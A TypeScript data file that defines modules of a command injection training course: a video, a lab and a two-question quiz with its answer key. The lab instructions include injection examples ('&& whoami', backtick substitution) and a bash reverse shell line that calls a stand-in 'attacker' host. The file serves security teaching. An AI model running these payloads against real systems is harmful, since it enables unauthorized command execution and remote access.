import { CourseModule } from '../../types/course';

export const commandInjectionModules: CourseModule[] = [
  {
    id: 'cmd-injection-intro',
    title: 'Introduction to Command Injection',
    duration: '1h',
    type: 'video',
    status: 'available',
    description: 'Learn about command injection vulnerabilities and their potential impact.',
    videoUrl: 'https://example.com/videos/command-injection-intro',
  },
  {
    id: 'cmd-injection-lab',
    title: 'Command Injection Lab',
    duration: '2h',
    type: 'lab',
    status: 'available',
    description: 'Practice identifying and exploiting command injection vulnerabilities.',
    labInstructions: `
Command Injection Testing Lab:

1. Environment Setup:
   - Access the vulnerable application
   - Review command execution points
   - Prepare testing tools

2. Basic Tests:
   - Test basic command separators (;, &&, ||)
   - Inject simple commands (whoami, id)
   - Test output redirection
   - Document findings

3. Advanced Challenges:
   - Bypass input filters
   - Execute reverse shells
   - Test blind command injection
   
Example Commands:
\`\`\`bash
# Basic command injection
ping 127.0.0.1 && whoami

# Command substitution
ping \`id\`

# Reverse shell
bash -i >& /dev/tcp/attacker/4444 0>&1
\`\`\`
    `,
  },
  {
    id: 'cmd-injection-quiz',
    title: 'Command Injection Quiz',
    duration: '30m',
    type: 'quiz',
    status: 'available',
    description: 'Test your knowledge of command injection vulnerabilities.',
    questions: [
      {
        question: 'Which character is used to chain commands in Unix-like systems?',
        options: [
          ';',
          ':',
          '/',
          '\\',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What is the best defense against command injection?',
        options: [
          'Input validation and command whitelisting',
          'Removing error messages',
          'Using complex commands',
          'Disabling the command line',
        ],
        correctAnswer: 0,
      },
    ],
  },
];